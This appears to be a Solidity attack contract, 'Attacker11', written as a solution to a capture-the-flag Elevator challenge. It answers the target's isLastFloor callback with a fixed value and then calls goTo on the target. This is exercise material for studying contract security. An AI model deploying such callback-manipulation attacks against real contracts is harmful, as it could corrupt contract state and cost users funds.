// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

abstract contract Elevator {
    function goTo(uint256 _floor) public virtual;
}

contract Attacker11 {
    function isLastFloor(uint256) external pure returns (bool) {
        return true;
    }

    function attack(address targetAddr, uint256 _floor) external {
        Elevator(targetAddr).goTo(_floor);
    }
}
